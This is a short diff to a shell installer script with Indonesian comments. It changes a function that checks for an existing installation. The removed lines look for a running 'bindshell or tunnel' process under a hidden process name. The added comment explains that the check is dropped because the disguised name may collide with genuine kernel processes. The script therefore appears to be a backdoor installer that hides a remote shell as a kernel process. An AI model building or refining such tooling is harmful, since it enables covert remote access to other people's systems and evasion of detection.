@@ -207,11 +207,7 @@ check_existing_installation() {
         warn "Installation already detected. If you want to reinstall, first uninstall with the token."
         exit 1
     fi
-    # Cek apakah proses bindshell atau tunnel sudah berjalan
-    if pgrep -f "$PROC_HIDDEN_NAME" >/dev/null 2>&1; then
-        warn "Process with name '$PROC_HIDDEN_NAME' already running. This may be an existing installation."
-        exit 1
-    fi
+    # Tidak mengecek proses karena bisa false positive dengan proses kernel asli
 }
 
 # ========== UNINSTALL (dengan token) ==========
